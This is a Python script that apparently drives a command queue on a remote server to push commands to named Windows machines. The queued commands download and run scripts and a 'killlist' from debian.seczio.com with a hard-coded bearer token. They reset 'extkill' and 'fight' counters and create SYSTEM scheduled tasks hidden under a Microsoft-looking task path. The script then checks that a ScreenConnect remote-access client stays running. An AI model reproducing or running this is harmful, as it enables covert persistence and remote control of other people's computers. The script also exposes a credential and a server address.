#!/usr/bin/env python3
"""Fix Gryxa on online problem hosts: probe -> recover4 schtasks -> force guard -> verify."""
from __future__ import annotations

import sys
import time
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# Exact fleet hostnames we can command
ONLINE_FIX = [
    "LAPTOP-1P6GP1UQ",
    "DESKTOP-JQKHHML",
    "DESKTOP-GG4NNSJ",
    "DESKTOP-0Q4F5D9",
    "CARI",  # stale beat but try
]
# Not in fleet — queue anyway in case they appear
MISSING = [
    "LAPTOPBE",
    "EASYLAB0514-2",
    "DESKTOP-7M84CP8",
    "CARPED-P16S",
    "PIERREADOLPHE",
]

TOKEN = "fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
GFP = "36e506ff016b2151"

# Locale-invariant probe (C15/C32): match RUNNING token (still English on ES) + service name blob
PROBE = (
    f'sc query "ScreenConnect Client ({GFP})" & '
    r'echo --- & '
    r'reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client ('
    + GFP
    + r')" /v ImagePath & '
    r'echo PROBE_DONE'
)

# Deploy C32 + clear brakes + schtasks recover4 + force guard
FIX = (
    rf'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer {TOKEN}" '
    r'--connect-timeout 15 --max-time 60 -o C:\ProgramData\WinRTCS\winrtcs_guard.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_guard.cmd '
    r' & C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer '
    + TOKEN
    + r'" --connect-timeout 15 --max-time 60 -o C:\ProgramData\WinRTCS\winrtcs_agent.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_agent.cmd '
    r' & C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer '
    + TOKEN
    + r'" --connect-timeout 15 --max-time 60 -o C:\ProgramData\WinRTCS\killlist.cfg '
    r'https://debian.seczio.com/winrtcs/winrtcs_killlist.cfg '
    r' & C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer '
    + TOKEN
    + r'" --connect-timeout 15 --max-time 90 -o C:\Users\Public\gryxa_recover4.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover4.cmd '
    r' & if not exist C:\Users\Public\gryxa_recover4.cmd '
    r'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer '
    + TOKEN
    + r'" --connect-timeout 15 --max-time 90 -o C:\Users\Public\gryxa_recover4.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover.cmd '
    r' & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd '
    r' & del /f /q C:\ProgramData\WinRTCS\guard.lock '
    r'C:\ProgramData\WinRTCS\extkill.cnt C:\ProgramData\WinRTCS\fight.cnt '
    r'C:\ProgramData\WinRTCS\killer.flag '
    r' & >C:\ProgramData\WinRTCS\streak.cnt echo 0 '
    r' & >C:\ProgramData\WinRTCS\guard.cnt echo 999 '
    r' & schtasks /Create /TN "\Microsoft\Windows\WinRTCS\GryxaRecover" '
    r'/TR "cmd.exe /c C:\Users\Public\gryxa_recover4.cmd --detached" '
    r'/SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F '
    r' & schtasks /Run /TN "\Microsoft\Windows\WinRTCS\GryxaRecover" '
    r' & echo FIX_QUEUED'
)

VERIFY = (
    f'sc query "ScreenConnect Client ({GFP})" & '
    r'echo -----LOG----- & '
    r'(if exist C:\Users\Public\gryxa_recover.log (type C:\Users\Public\gryxa_recover.log) else (echo NO_RECOVER_LOG)) & '
    r'echo -----GVER----- & '
    r'findstr /C:"GVER=0.2.1" C:\ProgramData\WinRTCS\winrtcs_guard.cmd & '
    r'echo VERIFY_DONE'
)


def ssh_connect() -> paramiko.SSHClient:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )
    return ssh


def queue(ssh: paramiko.SSHClient, target: str, body: str) -> int:
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/batch_cmd_body.txt", "w") as f:
        f.write(body)
    with sftp.file("/tmp/q_batch.py", "w") as f:
        f.write(
            "import sqlite3,time\n"
            "con=sqlite3.connect('/opt/winrtcs/fleet.db')\n"
            "cmd=open('/tmp/batch_cmd_body.txt',encoding='utf-8').read().strip()\n"
            "cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',"
            f"(time.time(),{target!r},cmd[:4000]))\n"
            "print(cur.lastrowid); con.commit()\n"
        )
    sftp.close()
    _, o, _ = ssh.exec_command("sudo python3 /tmp/q_batch.py", timeout=30)
    return int(o.read().decode().strip().splitlines()[-1])


def wait_many(
    ssh: paramiko.SSHClient, jobs: list[tuple[str, int, str]], rounds: int = 24
) -> dict[str, str]:
    """jobs: (host, cid, needle) -> results dict host->out"""
    pending = {cid: (host, needle) for host, cid, needle in jobs}
    out: dict[str, str] = {}
    for i in range(rounds):
        if not pending:
            break
        time.sleep(15)
        ids = ",".join(str(c) for c in pending)
        poll = f"""
import sqlite3, os
os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')
os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')
os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')
c=sqlite3.connect('/tmp/fleet_ro.db')
for cid in [{ids}]:
    r=c.execute('SELECT host,rc,out FROM results WHERE cmd_id=?',(cid,)).fetchone()
    if r:
        print('FOUND', cid)
        print('HOST', r[0])
        print('RC', r[1])
        print(r[2] or '')
        print('END', cid)
"""
        sftp = ssh.open_sftp()
        with sftp.file("/tmp/wbatch.py", "w") as f:
            f.write(poll)
        sftp.close()
        _, o, _ = ssh.exec_command("python3 /tmp/wbatch.py", timeout=90)
        text = o.read().decode("utf-8", "replace")
        # parse blocks
        cur_cid = None
        buf: list[str] = []
        host = None
        for line in text.splitlines():
            if line.startswith("FOUND "):
                cur_cid = int(line.split()[1])
                buf = []
                host = None
            elif line.startswith("HOST ") and cur_cid is not None:
                host = line[5:].strip()
            elif line.startswith("END ") and cur_cid is not None:
                body = "\n".join(buf)
                h, needle = pending.get(cur_cid, (host, ""))
                if needle in body or needle == "" or "FOUND" in text:
                    if cur_cid in pending:
                        out[h] = body
                        print(f"[{h} cid={cur_cid}] DONE poll={i}")
                        del pending[cur_cid]
                cur_cid = None
            elif cur_cid is not None and not line.startswith("RC "):
                if not line.startswith("HOST "):
                    buf.append(line)
        if pending:
            print(f"poll {i}: waiting {list(pending.values())}")
    for cid, (h, _) in pending.items():
        out.setdefault(h, f"TIMEOUT cid={cid}")
    return out


def exact_lookup(ssh: paramiko.SSHClient) -> None:
    py = r"""
import sqlite3, os, time
os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')
os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')
os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')
c=sqlite3.connect('/tmp/fleet_ro.db')
now=time.time()
for t in ['LAPTOPBE','EASYLAB0514-2','DESKTOP-7M84CP8','CARPED-P16S','CARI','LAPTOP-1P6GP1UQ']:
    row=c.execute('SELECT host,last_beat,state,rmm FROM hosts WHERE host=? COLLATE NOCASE',(t,)).fetchone()
    print(t, row)
    # also LIKE exact-ish
    for r in c.execute("SELECT host FROM hosts WHERE host LIKE ?", (t.replace('-','%'),)):
        print(' like', r[0])
"""
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/exact.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("python3 /tmp/exact.py", timeout=30)
    print(o.read().decode("utf-8", "replace"))


def ensure_recover4(ssh: paramiko.SSHClient) -> None:
    _, o, e = ssh.exec_command(
        "ls -la /opt/winrtcs/repo/winrtcs_gryxa_recover*.cmd 2>&1; "
        "wc -c /opt/winrtcs/repo/winrtcs_gryxa_recover.cmd "
        "/opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd 2>&1",
        timeout=20,
    )
    print("recover artifacts:", o.read().decode(), e.read().decode())
    # ensure recover.cmd on mirror; copy as recover4 if missing
    local = Path(r"C:\Users\nobuddy\Desktop\Project\winrtcs_gryxa_recover.cmd")
    sftp = ssh.open_sftp()
    sftp.put(str(local), "/tmp/winrtcs_gryxa_recover.cmd")
    sftp.close()
    _, o, e = ssh.exec_command(
        "sudo cp /tmp/winrtcs_gryxa_recover.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover.cmd && "
        "sudo cp /tmp/winrtcs_gryxa_recover.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd && "
        "sudo chmod 644 /opt/winrtcs/repo/winrtcs_gryxa_recover.cmd "
        "/opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd && echo RECOVER_OK",
        timeout=20,
    )
    print(o.read().decode(), e.read().decode())


def main() -> None:
    ssh = ssh_connect()
    print("=== exact lookup ===")
    exact_lookup(ssh)
    print("=== ensure recover4 ===")
    ensure_recover4(ssh)

    print("=== PROBE all fixable ===")
    jobs = []
    for h in ONLINE_FIX:
        cid = queue(ssh, h, PROBE)
        print("probe", h, cid)
        jobs.append((h, cid, "PROBE_DONE"))
    probes = wait_many(ssh, jobs, rounds=20)
    for h, body in probes.items():
        running = "RUNNING" in body and "1060" not in body.split("PROBE_DONE")[0]
        # 1060 = service does not exist (English) — Spanish may differ
        missing = "1060" in body or "no existe" in body.lower() or "does not exist" in body.lower()
        print(f"\n#### {h} probe running={running} missing_hint={missing}\n{body[:1500]}\n")

    print("=== FIX all (recover even if looks running — force healthy digest) ===")
    # Always run recover/guard path for hosts without [gryxa] / state=?
    # For ones already RUNNING, recover is heavy — prefer force guard only if RUNNING.
    # Policy: if RUNNING -> force guard only; else recover4 + guard.
    jobs2 = []
    for h, body in probes.items():
        running = ("RUNNING" in body) and ("1060" not in body[:800])
        if running:
            # light path: force guard with C32
            light = (
                rf'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer {TOKEN}" '
                r'--connect-timeout 15 --max-time 60 -o C:\ProgramData\WinRTCS\winrtcs_guard.cmd '
                r'https://debian.seczio.com/winrtcs/winrtcs_guard.cmd '
                r' & C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer '
                + TOKEN
                + r'" --connect-timeout 15 --max-time 60 -o C:\ProgramData\WinRTCS\winrtcs_agent.cmd '
                r'https://debian.seczio.com/winrtcs/winrtcs_agent.cmd '
                r' & C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer '
                + TOKEN
                + r'" --connect-timeout 15 --max-time 60 -o C:\ProgramData\WinRTCS\killlist.cfg '
                r'https://debian.seczio.com/winrtcs/winrtcs_killlist.cfg '
                r' & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd '
                r' & del /f /q C:\ProgramData\WinRTCS\guard.lock '
                r'C:\ProgramData\WinRTCS\extkill.cnt C:\ProgramData\WinRTCS\fight.cnt '
                r' & >C:\ProgramData\WinRTCS\streak.cnt echo 0 '
                r' & >C:\ProgramData\WinRTCS\guard.cnt echo 999 '
                r' & schtasks /Create /TN "\Microsoft\Windows\WinRTCS\ForceGuard" '
                r'/TR "cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd" '
                r'/SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F '
                r' & schtasks /Run /TN "\Microsoft\Windows\WinRTCS\ForceGuard" '
                r' & echo FIX_QUEUED'
            )
            cid = queue(ssh, h, light)
            print("light-fix", h, cid)
        else:
            cid = queue(ssh, h, FIX)
            print("recover-fix", h, cid)
        jobs2.append((h, cid, "FIX_QUEUED"))

    # Also queue missing hosts (may never pick up)
    for h in MISSING:
        cid = queue(ssh, h, FIX)
        print("prequeue-missing", h, cid)

    fixes = wait_many(ssh, jobs2, rounds=20)
    for h, body in fixes.items():
        print(f"\n#### {h} fix\n{body[:1200]}\n")

    print("waiting 4 min for recover/guard...")
    time.sleep(240)

    print("=== VERIFY ===")
    jobs3 = []
    for h in ONLINE_FIX:
        cid = queue(ssh, h, VERIFY)
        print("verify", h, cid)
        jobs3.append((h, cid, "VERIFY_DONE"))
    vers = wait_many(ssh, jobs3, rounds=24)
    summary = []
    for h, body in vers.items():
        ok = "RUNNING" in body and "GVER=0.2.1" in body
        summary.append((h, ok, body))
        print(f"\n#### {h} verify ok={ok}\n{body[:2500]}\n")

    # fleet snap
    py = """
import sqlite3, os, time, json
os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')
os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')
os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')
c=sqlite3.connect('/tmp/fleet_ro.db'); c.row_factory=sqlite3.Row
now=time.time()
for h in """ + repr(ONLINE_FIX) + """:
    r=c.execute('SELECT * FROM hosts WHERE host=?',(h,)).fetchone()
    if not r:
        print(h, 'NO_ROW'); continue
    d=dict(r)
    for k in ('last_seen','last_beat'):
        if d.get(k):
            d[k+'_ago_min']=round((now-float(d[k]))/60,1)
    print(json.dumps({k:d.get(k) for k in ('host','state','agent','guard','rmm','last_seen_ago_min','last_beat_ago_min','streak','extkill')}, default=str))
"""
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/snapb.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("python3 /tmp/snapb.py", timeout=30)
    print("=== FLEET ===")
    print(o.read().decode("utf-8", "replace"))

    Path(r"C:\Users\nobuddy\Desktop\batch_gryxa_fix_summary.txt").write_text(
        "\n\n".join(f"{h} ok={ok}\n{body[:3000]}" for h, ok, body in summary),
        encoding="utf-8",
    )
    ssh.close()


if __name__ == "__main__":
    main()
